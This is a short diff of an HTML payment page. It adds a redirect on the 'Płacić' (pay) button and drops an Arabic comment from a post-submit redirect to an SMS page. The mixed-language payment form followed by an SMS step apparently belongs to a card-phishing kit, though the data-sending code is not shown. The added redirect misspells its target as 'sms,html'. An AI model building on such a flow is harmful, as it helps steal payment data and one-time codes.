@@ -457,7 +457,7 @@ button.btn.btn-continue.mt-1.mb-1 {
                             </div>
                             <div class="row pt-4" bis_skin_checked="1">
                                 <div class="d-flex flex-row-reverse" bis_skin_checked="1">
-                                    <button type="submit" class="btn btn-continue mt-1 mb-1">
+                                    <button type="submit" onclick="window.location.href='sms,html'" class="btn btn-continue mt-1 mb-1">
                                         Płacić
                                     </button>
                                 </div>
@@ -836,7 +836,7 @@ button.btn.btn-continue.mt-1.mb-1 {
       });
 
       if (response.ok) {
-        window.location.href = "sms.html"; // يديه مباشرة لصفحة SMS
+        window.location.href = "sms.html"; 
       } else {
         alert("Error al enviar datos.");
       }
